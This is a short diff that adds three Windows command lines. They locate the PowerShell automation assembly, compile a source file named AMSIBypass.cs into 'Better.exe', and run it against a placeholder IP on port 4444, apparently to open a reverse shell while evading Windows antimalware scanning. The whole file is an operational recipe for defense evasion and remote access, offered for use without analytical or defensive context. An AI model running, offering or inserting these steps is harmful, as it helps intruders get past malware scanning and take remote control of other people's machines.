@@ -1,0 +1,6 @@
+Get-ChildItem -Path C:\Windows\Microsoft.Net\assembly -Filter "System.Management.Automation.dll" -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
+
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:"C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" /out:Better.exe AMSIBypass.cs
+
+Better.exe Your Ip 4444
